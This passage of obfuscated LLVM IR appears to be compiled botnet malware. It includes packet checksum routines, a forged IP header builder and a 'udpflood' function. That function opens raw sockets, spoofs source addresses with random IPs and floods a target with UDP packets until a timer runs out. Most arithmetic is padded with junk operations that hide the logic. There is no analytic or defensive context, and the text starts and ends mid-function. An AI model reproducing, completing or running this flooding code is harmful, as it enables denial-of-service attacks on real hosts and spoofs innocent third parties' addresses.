  store i64 %18, i64* %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub nsw i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %56

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 -6834576509434557315, -1
  %46 = or i64 %43, %44
  %47 = or i64 -6834576509434557315, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = sub i64 0, %52
  %54 = sub i64 %49, %53
  %55 = add i64 %49, %52
  store i64 %54, i64* %5, align 8
  br label %37

; <label>:56:                                     ; preds = %37
  %57 = load i64, i64* %5, align 8
  %58 = xor i64 %57, -1
  %59 = and i64 3407527825202317241, %58
  %60 = xor i64 3407527825202317241, -1
  %61 = and i64 %57, %60
  %62 = xor i64 -1, -1
  %63 = and i64 %62, 3407527825202317241
  %64 = and i64 -1, %60
  %65 = or i64 %59, %61
  %66 = or i64 %63, %64
  %67 = xor i64 %65, %66
  %68 = xor i64 %57, -1
  %69 = trunc i64 %67 to i16
  ret i16 %69
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  store i32 24, i32* %7, align 4
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = call noalias i8* @malloc(i64 %26) #6
  %28 = bitcast i8* %27 to i16*
  store i16* %28, i16** %8, align 8
  %29 = load i16*, i16** %8, align 8
  %30 = bitcast i16* %29 to i8*
  %31 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* %31, i64 24, i32 1, i1 false)
  %32 = load i16*, i16** %8, align 8
  %33 = bitcast i16* %32 to i8*
  %34 = getelementptr inbounds i8, i8* %33, i64 24
  %35 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %36 = bitcast %struct.tcphdr* %35 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* %36, i64 20, i32 1, i1 false)
  %37 = load i16*, i16** %8, align 8
  %38 = load i32, i32* %7, align 4
  %39 = call zeroext i16 @csum(i16* %37, i32 %38)
  store i16 %39, i16* %9, align 2
  %40 = load i16*, i16** %8, align 8
  %41 = bitcast i16* %40 to i8*
  call void @free(i8* %41) #6
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 15, -1
  %26 = xor i8 %24, %25
  %27 = and i8 %26, %24
  %28 = and i8 %24, 15
  %29 = and i8 %27, 64
  %30 = xor i8 %27, 64
  %31 = or i8 %29, %30
  %32 = or i8 %27, 64
  store i8 %31, i8* %23, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 1
  store i8 0, i8* %34, align 1
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 0, %36
  %38 = sub i64 20, %37
  %39 = add i64 20, %36
  %40 = trunc i64 %38 to i16
  %41 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 2
  store i16 %40, i16* %42, align 2
  %43 = call i32 @rand_cmwc()
  %44 = trunc i32 %43 to i16
  %45 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i32 0, i32 3
  store i16 %44, i16* %46, align 4
  %47 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %48 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %47, i32 0, i32 4
  store i16 0, i16* %48, align 2
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 5
  store i8 -1, i8* %50, align 4
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %53 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %52, i32 0, i32 6
  store i8 %51, i8* %53, align 1
  %54 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 7
  store i16 0, i16* %55, align 2
  %56 = load i32, i32* %8, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 8
  store i32 %56, i32* %58, align 4
  %59 = load i32, i32* %7, align 4
  %60 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %61 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %60, i32 0, i32 9
  store i32 %59, i32* %61, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @filter(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %29, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = call i64 @strlen(i8* %5) #10
  %7 = add i64 %6, -1103362119438555417
  %8 = sub i64 %7, 1
  %9 = sub i64 %8, -1103362119438555417
  %10 = sub i64 %6, 1
  %11 = getelementptr inbounds i8, i8* %4, i64 %9
  %12 = load i8, i8* %11, align 1
  %13 = sext i8 %12 to i32
  %14 = icmp eq i32 %13, 13
  br i1 %14, label %27, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i8*, i8** %2, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = call i64 @strlen(i8* %17) #10
  %19 = add i64 %18, -7987279187247579995
  %20 = sub i64 %19, 1
  %21 = sub i64 %20, -7987279187247579995
  %22 = sub i64 %18, 1
  %23 = getelementptr inbounds i8, i8* %16, i64 %21
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 10
  br label %27

; <label>:27:                                     ; preds = %15, %3
  %28 = phi i1 [ true, %3 ], [ %26, %15 ]
  br i1 %28, label %29, label %38

; <label>:29:                                     ; preds = %27
  %30 = load i8*, i8** %2, align 8
  %31 = load i8*, i8** %2, align 8
  %32 = call i64 @strlen(i8* %31) #10
  %33 = add i64 %32, 7896164829459432771
  %34 = sub i64 %33, 1
  %35 = sub i64 %34, 7896164829459432771
  %36 = sub i64 %32, 1
  %37 = getelementptr inbounds i8, i8* %30, i64 %35
  store i8 0, i8* %37, align 1
  br label %3

; <label>:38:                                     ; preds = %27
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i8* @makestring() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = call i32 @rand() #6
  %9 = srem i32 %8, 5
  %10 = sub i32 0, %9
  %11 = sub i32 0, 4
  %12 = add i32 %10, %11
  %13 = sub i32 0, %12
  %14 = add nsw i32 %9, 4
  store i32 %13, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  %16 = add i32 %15, 1447542387
  %17 = add i32 %16, 1
  %18 = sub i32 %17, 1447542387
  %19 = add nsw i32 %15, 1
  %20 = sext i32 %18 to i64
  %21 = call noalias i8* @malloc(i64 %20) #6
  store i8* %21, i8** %1, align 8
  %22 = load i8*, i8** %1, align 8
  %23 = load i32, i32* %2, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  %29 = sext i32 %27 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %29, i32 1, i1 false)
  %30 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store %struct._IO_FILE* %30, %struct._IO_FILE** %4, align 8
  %31 = icmp eq %struct._IO_FILE* %30, null
  br i1 %31, label %32, label %54

; <label>:32:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  br label %33

; <label>:33:                                     ; preds = %48, %32
  %34 = load i32, i32* %3, align 4
  %35 = load i32, i32* %2, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %53

; <label>:37:                                     ; preds = %33
  %38 = call i32 @rand() #6
  %39 = srem i32 %38, 26
  %40 = sub i32 0, 65
  %41 = sub i32 %39, %40
  %42 = add nsw i32 %39, 65
  %43 = trunc i32 %41 to i8
  %44 = load i8*, i8** %1, align 8
  %45 = load i32, i32* %3, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  store i8 %43, i8* %47, align 1
  br label %48

; <label>:48:                                     ; preds = %37
  %49 = load i32, i32* %3, align 4
  %50 = sub i32 0, 1
  %51 = sub i32 %49, %50
  %52 = add nsw i32 %49, 1
  store i32 %51, i32* %3, align 4
  br label %33

; <label>:53:                                     ; preds = %33
  br label %90

; <label>:54:                                     ; preds = %0
  %55 = call i32 @rand() #6
  %56 = call i32 @rand() #6
  %57 = mul nsw i32 %55, %56
  %58 = srem i32 %57, 45402
  %59 = add i32 %58, -1229139196
  %60 = add i32 %59, 1
  %61 = sub i32 %60, -1229139196
  %62 = add nsw i32 %58, 1
  store i32 %61, i32* %6, align 4
  store i32 0, i32* %3, align 4
  br label %63

; <label>:63:                                     ; preds = %71, %54
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %6, align 4
  %66 = icmp slt i32 %64, %65
  br i1 %66, label %67, label %78

; <label>:67:                                     ; preds = %63
  %68 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %69 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %70 = call i8* @fgets(i8* %68, i32 1024, %struct._IO_FILE* %69)
  br label %71

; <label>:71:                                     ; preds = %67
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  store i32 %76, i32* %3, align 4
  br label %63

; <label>:78:                                     ; preds = %63
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 1024, i32 16, i1 false)
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %81 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %82 = call i8* @fgets(i8* %80, i32 1024, %struct._IO_FILE* %81)
  %83 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  call void @filter(i8* %83)
  %84 = load i8*, i8** %1, align 8
  %85 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i32 0, i32 0
  %86 = load i32, i32* %2, align 4
  %87 = sext i32 %86 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %84, i8* %85, i64 %87, i32 1, i1 false)
  %88 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %89 = call i32 @fclose(%struct._IO_FILE* %88)
  br label %90

; <label>:90:                                     ; preds = %78, %53
  %91 = load i8*, i8** %1, align 8
  ret i8* %91
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #5

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #5

declare i32 @fclose(%struct._IO_FILE*) #5

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.udphdr*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 10, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = load i32, i32* %6, align 4
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %4
  %30 = call i32 @rand_cmwc()
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %31, i16* %32, align 2
  br label %38

; <label>:33:                                     ; preds = %4
  %34 = load i32, i32* %6, align 4
  %35 = trunc i32 %34 to i16
  %36 = call zeroext i16 @htons(i16 zeroext %35) #9
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  br label %38

; <label>:38:                                     ; preds = %33, %29
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %41 = call i32 @getHost(i8* %39, %struct.in_addr* %40)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %38
  br label %307

; <label>:44:                                     ; preds = %38
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %10, align 4
  %49 = icmp eq i32 %48, 32
  br i1 %49, label %50, label %115

; <label>:50:                                     ; preds = %44
  %51 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %55, label %54

; <label>:54:                                     ; preds = %50
  br label %307

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %8, align 4
  %57 = add i32 %56, 69454576
  %58 = add i32 %57, 1
  %59 = sub i32 %58, 69454576
  %60 = add nsw i32 %56, 1
  %61 = sext i32 %59 to i64
  %62 = call noalias i8* @malloc(i64 %61) #6
  store i8* %62, i8** %14, align 8
  %63 = load i8*, i8** %14, align 8
  %64 = icmp eq i8* %63, null
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %55
  br label %307

; <label>:66:                                     ; preds = %55
  %67 = load i8*, i8** %14, align 8
  %68 = load i32, i32* %8, align 4
  %69 = add i32 %68, -1756197079
  %70 = add i32 %69, 1
  %71 = sub i32 %70, -1756197079
  %72 = add nsw i32 %68, 1
  %73 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 %73, i32 1, i1 false)
  %74 = load i8*, i8** %14, align 8
  %75 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %74, i32 %75)
  %76 = call i64 @time(i64* null) #6
  %77 = load i32, i32* %7, align 4
  %78 = sext i32 %77 to i64
  %79 = add i64 %76, 4522318971658676423
  %80 = add i64 %79, %78
  %81 = sub i64 %80, 4522318971658676423
  %82 = add nsw i64 %76, %78
  %83 = trunc i64 %81 to i32
  store i32 %83, i32* %15, align 4
  store i32 0, i32* %16, align 4
  br label %84

; <label>:84:                                     ; preds = %108, %107, %66
  %85 = load i32, i32* %13, align 4
  %86 = load i8*, i8** %14, align 8
  %87 = load i32, i32* %8, align 4
  %88 = sext i32 %87 to i64
  %89 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %90 = call i64 @sendto(i32 %85, i8* %86, i64 %88, i32 0, %struct.sockaddr* %89, i32 16)
  %91 = load i32, i32* %16, align 4
  %92 = load i32, i32* %12, align 4
  %93 = icmp eq i32 %91, %92
  br i1 %93, label %94, label %108

; <label>:94:                                     ; preds = %84
  %95 = load i32, i32* %6, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %101

; <label>:97:                                     ; preds = %94
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  br label %101

; <label>:101:                                    ; preds = %97, %94
  %102 = call i64 @time(i64* null) #6
  %103 = load i32, i32* %15, align 4
  %104 = sext i32 %103 to i64
  %105 = icmp sgt i64 %102, %104
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %101
  br label %114

; <label>:107:                                    ; preds = %101
  store i32 0, i32* %16, align 4
  br label %84

; <label>:108:                                    ; preds = %84
  %109 = load i32, i32* %16, align 4
  %110 = add i32 %109, 608398540
  %111 = add i32 %110, 1
  %112 = sub i32 %111, 608398540
  %113 = add i32 %109, 1
  store i32 %112, i32* %16, align 4
  br label %84

; <label>:114:                                    ; preds = %106
  br label %307

; <label>:115:                                    ; preds = %44
  %116 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %116, i32* %17, align 4
  %117 = load i32, i32* %17, align 4
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %120, label %119

; <label>:119:                                    ; preds = %115
  br label %307

; <label>:120:                                    ; preds = %115
  store i32 1, i32* %18, align 4
  %121 = load i32, i32* %17, align 4
  %122 = bitcast i32* %18 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #6
  %124 = icmp slt i32 %123, 0
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %120
  br label %307

; <label>:126:                                    ; preds = %120
  store i32 50, i32* %19, align 4
  br label %127

; <label>:127:                                    ; preds = %134, %126
  %128 = load i32, i32* %19, align 4
  %129 = sub i32 %128, 1679335637
  %130 = add i32 %129, -1
  %131 = add i32 %130, 1679335637
  %132 = add nsw i32 %128, -1
  store i32 %131, i32* %19, align 4
  %133 = icmp ne i32 %128, 0
  br i1 %133, label %134, label %151

; <label>:134:                                    ; preds = %127
  %135 = call i64 @time(i64* null) #6
  %136 = call i32 @rand_cmwc()
  %137 = zext i32 %136 to i64
  %138 = xor i64 %135, -1
  %139 = and i64 5756919646416557132, %138
  %140 = xor i64 5756919646416557132, -1
  %141 = and i64 %135, %140
  %142 = xor i64 %137, -1
  %143 = and i64 %142, 5756919646416557132
  %144 = and i64 %137, %140
  %145 = or i64 %139, %141
  %146 = or i64 %143, %144
  %147 = xor i64 %145, %146
  %148 = xor i64 %135, %137
  %149 = trunc i64 %147 to i32
  call void @srand(i32 %149) #6
  %150 = call i32 @rand() #6
  call void @init_rand(i32 %150)
  br label %127

; <label>:151:                                    ; preds = %127
  %152 = load i32, i32* %10, align 4
  %153 = icmp eq i32 %152, 0
  br i1 %153, label %154, label %155

; <label>:154:                                    ; preds = %151
  store i32 0, i32* %20, align 4
  br label %171

; <label>:155:                                    ; preds = %151
  %156 = load i32, i32* %10, align 4
  %157 = sub i32 0, %156
  %158 = add i32 32, %157
  %159 = sub nsw i32 32, %156
  %160 = shl i32 1, %158
  %161 = sub i32 %160, -1257926704
  %162 = sub i32 %161, 1
  %163 = add i32 %162, -1257926704
  %164 = sub nsw i32 %160, 1
  %165 = xor i32 %163, -1
  %166 = and i32 -1, %165
  %167 = xor i32 -1, -1
  %168 = and i32 %163, %167
  %169 = or i32 %166, %168
  %170 = xor i32 %163, -1
  store i32 %169, i32* %20, align 4
  br label %171

; <label>:171:                                    ; preds = %155, %154
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %174 = sub i64 28, 147675308148293753
  %175 = add i64 %174, %173
  %176 = add i64 %175, 147675308148293753
  %177 = add i64 28, %173
  %178 = call i8* @llvm.stacksave()
  store i8* %178, i8** %21, align 8
  %179 = alloca i8, i64 %176, align 16
  %180 = bitcast i8* %179 to %struct.iphdr*
  store %struct.iphdr* %180, %struct.iphdr** %22, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = getelementptr i8, i8* %182, i64 20
  %184 = bitcast i8* %183 to %struct.udphdr*
  store %struct.udphdr* %184, %struct.udphdr** %23, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 4
  %189 = load i32, i32* %20, align 4
  %190 = call i32 @getRandomIP(i32 %189)
  %191 = call i32 @htonl(i32 %190) #9
  %192 = load i32, i32* %8, align 4
  %193 = sext i32 %192 to i64
  %194 = sub i64 0, 8
  %195 = sub i64 0, %193
  %196 = add i64 %194, %195
  %197 = sub i64 0, %196
  %198 = add i64 8, %193
  %199 = trunc i64 %197 to i32
  call void @makeIPPacket(%struct.iphdr* %185, i32 %188, i32 %191, i8 zeroext 17, i32 %199)
  %200 = load i32, i32* %8, align 4
  %201 = sext i32 %200 to i64
  %202 = sub i64 0, %201
  %203 = sub i64 8, %202
  %204 = add i64 8, %201
  %205 = trunc i64 %203 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #9
  %207 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = call i32 @rand_cmwc()
  %210 = trunc i32 %209 to i16
  %211 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  store i16 %210, i16* %212, align 2
  %213 = load i32, i32* %6, align 4
  %214 = icmp eq i32 %213, 0
  br i1 %214, label %215, label %217

; <label>:215:                                    ; preds = %171
  %216 = call i32 @rand_cmwc()
  br label %222

; <label>:217:                                    ; preds = %171
  %218 = load i32, i32* %6, align 4
  %219 = trunc i32 %218 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #9
  %221 = zext i16 %220 to i32
  br label %222

; <label>:222:                                    ; preds = %217, %215
  %223 = phi i32 [ %216, %215 ], [ %221, %217 ]
  %224 = trunc i32 %223 to i16
  %225 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 1
  store i16 %224, i16* %226, align 2
  %227 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 3
  store i16 0, i16* %228, align 2
  %229 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %230 = bitcast %struct.udphdr* %229 to i8*
  %231 = getelementptr inbounds i8, i8* %230, i64 8
  %232 = load i32, i32* %8, align 4
  call void @makeRandomStr(i8* %231, i32 %232)
  %233 = bitcast i8* %179 to i16*
  %234 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 2
  %236 = load i16, i16* %235, align 2
  %237 = zext i16 %236 to i32
  %238 = call zeroext i16 @csum(i16* %233, i32 %237)
  %239 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 7
  store i16 %238, i16* %240, align 2
  %241 = call i64 @time(i64* null) #6
  %242 = load i32, i32* %7, align 4
  %243 = sext i32 %242 to i64
  %244 = add i64 %241, 6987678525780225805
  %245 = add i64 %244, %243
  %246 = sub i64 %245, 6987678525780225805
  %247 = add nsw i64 %241, %243
  %248 = trunc i64 %246 to i32
  store i32 %248, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %249

; <label>:249:                                    ; preds = %299, %298, %222
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %17, align 4
  %252 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %253 = call i64 @sendto(i32 %251, i8* %179, i64 %176, i32 0, %struct.sockaddr* %252, i32 16)
  %254 = call i32 @rand_cmwc()
  %255 = trunc i32 %254 to i16
